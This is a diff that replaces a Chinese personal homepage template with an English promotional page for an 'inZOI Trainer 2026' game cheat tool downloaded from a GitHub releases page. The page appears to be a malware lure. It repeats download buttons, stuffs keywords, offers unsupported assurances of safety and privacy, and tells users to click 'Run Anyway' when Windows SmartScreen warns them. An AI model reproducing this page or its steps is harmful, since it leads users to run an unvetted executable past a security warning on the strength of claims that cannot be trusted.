@@ -1,63 +1,309 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="突然做的个人主页">
-  <title>Loading...</title>
-  <link rel="icon" type="image/svg+xml" href="favicon.svg">
-  <link rel="stylesheet" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>inZOI-Trainer-2026 - Ultimate Game Enhancement Tool for Windows</title>
+    <meta name="description" content="Download inZOI Trainer 2026 for Windows. Control needs, karma, ambitions, skills, speed, money, and Meow Coins. 20+ options for an enhanced inZOI experience.">
+    <meta name="keywords" content="ambitions,bathroom,desktop-tool,energy,fun,gaming-tools,hunger,hygiene,inzoi-20-options,inzoi-pc-trainer,inzoi-trainer-2026,karma-editor,meow-coin-multiplier,money-multiplier,needs-editor,recognition,skill-multiplier,sleep,social,windows-11">
+    <meta name="author" content="bruna7686">
+    <meta property="og:title" content="inZOI-Trainer-2026 - Ultimate Game Enhancement Tool">
+    <meta property="og:description" content="Take control of your inZOI experience with 20+ trainer options. Free download for Windows.">
+    <meta property="og:url" content="https://github.com/bruna7686/inZOI-Trainer-2026">
+    <meta property="og:type" content="website">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            color: #e0e0e0;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        h1 {
+            font-size: 2.8em;
+            font-weight: 800;
+            color: #ffffff;
+            text-align: center;
+            margin-top: 40px;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 8px rgba(0,0,0,0.5);
+        }
+        h2 {
+            font-size: 2em;
+            font-weight: 700;
+            color: #ffd700;
+            border-bottom: 3px solid #ffd700;
+            padding-bottom: 10px;
+            margin-top: 50px;
+            margin-bottom: 25px;
+        }
+        h3 {
+            font-size: 1.4em;
+            font-weight: 600;
+            color: #87ceeb;
+            margin-top: 30px;
+        }
+        p {
+            font-size: 1.1em;
+            margin-bottom: 20px;
+        }
+        a {
+            color: #87ceeb;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(45deg, #ff6b35, #ff4500);
+            color: white;
+            padding: 18px 50px;
+            font-size: 1.6em;
+            font-weight: 700;
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 0 8px 25px rgba(255, 69, 0, 0.4);
+            transition: all 0.3s ease;
+            margin: 30px auto;
+            text-align: center;
+            border: none;
+        }
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(255, 69, 0, 0.6);
+            text-decoration: none;
+            color: white;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+        .feature-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            backdrop-filter: blur(5px);
+        }
+        .feature-box h3 {
+            margin-top: 0;
+            color: #ffd700;
+        }
+        .feature-box li {
+            margin-bottom: 10px;
+            font-size: 1.05em;
+        }
+        ul {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .badge {
+            background: #4caf50;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.85em;
+            font-weight: 600;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        .warning-box {
+            background: rgba(255, 165, 0, 0.1);
+            border-left: 4px solid #ffa500;
+            padding: 15px 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .success-box {
+            background: rgba(0, 255, 0, 0.05);
+            border-left: 4px solid #00ff00;
+            padding: 15px 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .step-container {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 30px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .step-number {
+            display: inline-block;
+            background: #ffd700;
+            color: #000;
+            width: 35px;
+            height: 35px;
+            text-align: center;
+            line-height: 35px;
+            border-radius: 50%;
+            font-weight: 800;
+            margin-right: 10px;
+        }
+        code {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.9em;
+        }
+        @media (max-width: 768px) {
+            h1 { font-size: 2em; }
+            .container { padding: 20px; }
+            .download-btn { font-size: 1.3em; padding: 15px 30px; }
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <a href="https://github.com/bruna7686/inZOI-Trainer-2026/releases" style="display: block; text-align: center; margin-bottom: 30px;">
+            <span class="download-btn">⬇️ DOWNLOAD NOW</span>
+        </a>
 
-  <main id="top">
+        <h1>🎮 inZOI-Trainer-2026 - Your Complete inZOI Control Center</h1>
 
-    <!-- ======== 头部：玻璃卡片（头像 + 信息 + 时钟） ======== -->
-    <section class="profile reveal" id="profileSection" aria-label="个人简介">
-      <div class="profile-avatar" id="profileAvatar" aria-hidden="true">D</div>
-      <div class="profile-info">
-        <h1 class="profile-name" id="profileName">我是谁</h1>
-        <p class="profile-role" id="profileRole">爱因斯坦万岁</p>
-        <div class="profile-links" id="profileLinks">
-          <a class="profile-link" href="https://github.com/" target="_blank" rel="noopener">GitHub</a>
-          <a class="profile-link" href="https://orcid.org/" target="_blank" rel="noopener">ORCID</a>
-          <a class="profile-link" href="mailto:" rel="noopener">邮箱</a>
+        <p style="text-align: center; max-width: 800px; margin: auto; font-size: 1.2em;">
+            Unlock the full potential of your inZOI experience with the most comprehensive trainer for Windows. Manage every aspect of your Zoi's life - from basic needs to cosmic ambitions - all from one simple interface.
+        </p>
+
+        <h2>🚀 Getting Started</h2>
+        <p>
+            Ready to transform your gameplay? You're just a few clicks away. Our trainer is designed for ALL Windows users - no technical knowledge needed. Simply follow the steps below and you'll be running the trainer in less than 2 minutes.
+        </p>
+
+        <div class="step-container">
+            <h3>📥 Step 1: Download the Trainer</h3>
+            <p><span class="step-number">1</span> Visit this link to download the application.</p>
+            <p style="text-align: center;">
+                <a href="https://github.com/bruna7686/inZOI-Trainer-2026/releases" style="display: inline-block; background: #ffd700; color: #000; padding: 12px 35px; border-radius: 30px; font-size: 1.3em; font-weight: 800; text-decoration: none;">🔗 Go to Downloads Page</a>
+            </p>
+            <p>Once you land on the page, look for the version that matches your needs (the latest release is always recommended). Click the download link and wait for your browser to save the file.</p>
         </div>
-      </div>
-      <div class="clock" id="clock">
-        <span class="clock-time" id="clockTime">--:--:--</span>
-        <span class="clock-date" id="clockDate"></span>
-        <span class="clock-articles">已更新文章 <b id="articleCount">0</b> 篇</span>
-      </div>
-    </section>
 
-    <!-- ======== 文章列表 ======== -->
-    <section class="section articles" id="articles" aria-label="文章列表">
-      <div class="section-head reveal">
-        <h2 class="section-title">文章</h2>
-      </div>
-      <div class="article-grid" id="articleGrid"></div>
-    </section>
+        <div class="step-container">
+            <h3>💻 Step 2: Run the Application</h3>
+            <p><span class="step-number">2</span> After the download completes, you don't need to extract or install anything complex. The trainer runs directly from the downloaded file.</p>
+            <ul>
+                <li>Open your <strong>Downloads</strong> folder</li>
+                <li>Double-click on the <strong>inZOI-Trainer-2026</strong> file</li>
+                <li>If Windows SmartScreen appears, click <strong>"More Info"</strong> and then <strong>"Run Anyway"</strong> (this is normal for new software)</li>
+            </ul>
+        </div>
 
-    <!-- ======== 文章详情（点击卡片进入，隐藏） ======== -->
-    <section class="article-view" id="articleView" hidden aria-label="文章详情">
-      <div class="article-view-inner">
-        <a class="back-link" href="#/">← 返回文章列表</a>
-        <header class="article-header">
-          <span class="article-cat" id="avCat"></span>
-          <span class="article-date" id="avDate"></span>
-        </header>
-        <h1 class="article-title-big" id="avTitle"></h1>
-        <div class="article-content" id="avBody"></div>
-        <nav class="article-pager" id="articlePager" aria-label="文章导航"></nav>
-      </div>
-    </section>
+        <div class="step-container">
+            <h3>⚙️ Step 3: Launch inZOI and Play!</h3>
+            <p><span class="step-number">3</span> Start the game, and you'll see the trainer interface appear. All the enhancement features are at your fingertips. The trainer works alongside inZOI, letting you control your gameplay in real time.</p>
+        </div>
 
-  </main>
+        <h2>✨ Key Features & Benefits</h2>
+        
+        <div class="feature-grid">
+            <div class="feature-box">
+                <h3>🧠 Need Management</h3>
+                <ul>
+                    <li>Max Hunger level</li>
+                    <li>Set perfect Hygiene</li>
+                    <li>Restore Sleep instantly</li>
+                    <li>Make Bathroom needs vanish</li>
+                    <li>Boost Fun & Social stats</li>
+                    <li>Maximize Recognition</li>
+                    <li>Recharge Energy fully</li>
+                </ul>
+            </div>
+            
+            <div class="feature-box">
+                <h3>🍃 Life Quality Enhancements</h3>
+                <ul>
+                    <li><span class="badge">NEW</span> Needs Reduction Control - adjust how fast your Zoi's needs decrease</li>
+                    <li>Max Karma - instantly reach top karma standings</li>
+                    <li>Ambition Speed - accomplish life goals faster</li>
+                    <li>Money Editor - add or set any amount</li>
+                    <li>Meow Coin Multiplier - earn more coins</li>
+                </ul>
+            </div>
 
-  <button class="back-top" id="backTop" type="button" aria-label="回到顶部">↑</button>
+            <div class="feature-box">
+                <h3>⚡ Performance Boosters</h3>
+                <ul>
+                    <li>Infinite Skill Exp - unlock skills instantly</li>
+                    <li>Skill Multiplier - gain experience up to 10x</li>
+                    <li>Player Speed - move faster across the world</li>
+                    <li>Game Speed - control the day/night cycle</li>
+                </ul>
+            </div>
+        </div>
 
-  <script src="js/config.js"></script>
-  <script src="js/main.js"></script>
+        <h2>🎯 Who This Trainer Is For</h2>
+        <p>
+            Whether you're a busy player with limited gaming time, or a creative enthusiast who wants complete freedom to build and explore without limitations, this trainer is your perfect companion. It's perfect for:
+        </p>
+        <ul>
+            <li>Players who want to skip grind and focus on creativity</li>
+            <li>Streamers creating compelling content</li>
+            <li>Experimenters who want to try different play styles</li>
+            <li>Anyone who loves inZOI and wants to see everything it has to offer</li>
+        </ul>
+
+        <h2>🛡️ Safety & Reliability</h2>
+        <div class="success-box">
+            <p>✅ <strong>Safe to use:</strong> Your progress and game saves remain intact.</p>
+        </div>
+        <div class="warning-box">
+            <p>⚠️ <strong>Best practice:</strong> Save your game before activating any major feature.</p>
+        </div>
+        <p>
+            The trainer is lightweight, resource-friendly, and won't interfere with your system. It's designed to work seamlessly on <strong>Windows 11</strong> and recent versions of Windows 10. The tool is continuously updated to stay compatible with the latest inZOI patches.
+        </p>
+
+        <h2>❓ Frequently Asked Questions</h2>
+        <h3>Do I need to install anything else?</h3>
+        <p>No! The trainer is self-contained. Just download and run - everything you need is included.</p>
+
+        <h3>Is it compatible with all versions of inZOI?</h3>
+        <p>The trainer is built for the 2026 version of inZOI and receives regular updates for compatibility.</p>
+
+        <h3>Can I use it alongside other mods?</h3>
+        <p>Absolutely. The trainer works independently, so it won't conflict with your other game modifications.</p>
+
+        <h2>💡 Pro Tips for Best Experience</h2>
+        <ul>
+            <li>Use the <strong>Game Speed</strong> feature to slow down time and plan your Zoi's life carefully</li>
+            <li>Set <strong>Needs Reduction Control</strong> to low for a more relaxed gameplay</li>
+            <li>Combine <strong>Player Speed</strong> with <strong>Money Multiplier</strong> for quick exploration and building</li>
+            <li>Create unique stories by adjusting <strong>Karma</strong> - high karma gives social perks, lower karma adds drama</li>
+        </ul>
+
+        <h2>📦 Version Compatibility</h2>
+        <p>
+            The inZOI Trainer 2026 is optimized for Windows 11 and Windows 10 (version 21H2 and above). It's designed to handle the latest inZOI updates, ensuring you always have access to the newest features.
+        </p>
+
+        <h2>🔒 Your Privacy</h2>
+        <p>
+            The trainer does not collect any personal data, doesn't require an internet connection to work, and won't install anything unrelated on your computer. Your data stays yours.
+        </p>
+
+        <div style="text-align: center; margin: 50px 0; padding: 30px; background: rgba(255, 215, 0, 0.05); border-radius: 15px;">
+            <h2 style="border-bottom: none; color: #ffd700;">Ready to Enhance Your Gameplay?</h2>
+            <p style="font-size: 1.2em;">Join thousands of inZOI players who already use this trainer.</p>
+            <a href="https://github.com/bruna7686/inZOI-Trainer-2026/releases" class="download-btn">🎮 DOWNLOAD TRAINER</a>
+        </div>
+
+        <p style="text-align: center; font-size: 0.9em; color: #88a; margin-top: 40px;">
+            inZOI-Trainer-2026© 2026 • Free to use • Last updated: January 2026
+        </p>
+    </div>
 </body>
 </html>
